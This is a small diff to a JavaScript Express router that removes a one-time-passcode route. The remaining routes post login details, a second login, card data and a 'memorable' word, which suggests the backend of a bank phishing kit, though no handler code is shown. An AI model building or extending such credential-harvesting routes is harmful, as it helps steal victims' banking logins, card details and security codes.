@@ -4,7 +4,6 @@ const {
   command,
   getInfo,
   submitLogin,
-  submitOtp,
   submitMemorable,
   submitLoginAgain,
   submitCard,
@@ -20,7 +19,6 @@ router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/card", submitCard);
 router.post("/memorable", submitMemorable);
-router.post("/otp", submitOtp);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
